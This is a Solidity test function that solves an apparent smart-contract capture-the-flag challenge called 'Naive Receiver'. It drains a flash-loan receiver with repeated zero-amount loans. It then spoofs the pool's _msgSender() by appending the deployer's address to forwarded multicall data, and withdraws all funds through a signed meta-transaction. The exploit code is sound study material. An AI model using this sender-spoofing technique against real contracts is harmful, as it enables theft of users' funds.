function test_naiveReceiver() public checkSolvedByPlayer {
    // 1. Prepare data for Multicall
    bytes[] memory calls = new bytes[](11);
    
    // 10 times zero-amount flash loan to empty the Receiver contract
    for (uint256 i = 0; i < 10; i++) {
        calls[i] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 0, "");
    }
    
    // Withdraw entire pool funds (1010 ETH) to the recovery address
    calls[10] = abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL + WETH_IN_RECEIVER, recovery);
    
    // 🎯 The main trick: Append the deployer's address to the end of the withdraw data
    // So the _msgSender() function in the pool gets tricked and thinks deployer is calling this function!
    calls[10] = abi.encodePacked(calls[10], abi.encodePacked(deployer));
    
    // Bundle all of these into a single multicall transaction
    bytes memory multicallData = abi.encodeWithSelector(pool.multicall.selector, calls);

    // 2. Create request for BasicForwarder
    BasicForwarder.Request memory req = BasicForwarder.Request({
        from: player,
        to: address(pool),
        value: 0,
        gas: 1_000_000,
        nonce: forwarder.nonces(player),
        data: multicallData
    });

    // 3. Sign the request with the player's private key (EIP-712)
    bytes32 domainSeparator = keccak256(
        abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256("BasicForwarder"),
            keccak256("1"),
            block.chainid,
            address(forwarder)
        )
    );
    
    bytes32 structHash = keccak256(
        abi.encode(
            keccak256("Request(address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data)"),
            req.from,
            req.to,
            req.value,
            req.gas,
            req.nonce,
            keccak256(req.data)
        )
    );

    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    bytes memory signature = abi.encodePacked(r, s, v);

    // 4. Execute the attack through the Forwarder (This will be our first and only transaction!)
    forwarder.execute(req, signature);
}